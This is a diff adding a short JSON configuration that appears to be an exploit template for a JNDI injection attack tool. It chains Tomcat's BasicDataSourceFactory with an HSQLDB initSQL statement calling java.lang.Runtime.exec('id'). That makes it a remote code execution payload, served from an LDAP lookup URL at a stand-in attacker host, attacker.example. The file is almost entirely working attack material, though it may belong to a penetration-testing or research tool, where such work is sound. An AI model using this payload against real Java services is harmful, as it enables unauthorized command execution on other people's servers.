@@ -1,0 +1,13 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
+    "reference_class": "javax.sql.DataSource",
+    "factory_attrs": {
+        "url": "jdbc:hsqldb:mem:test",
+        "driverClassName": "org.hsqldb.jdbc.JDBCDriver",
+        "initSQL": "CALL \"java.lang.Runtime\".exec('id')"
+    },
+    "sink_type": "jdbc_hsqldb_call",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
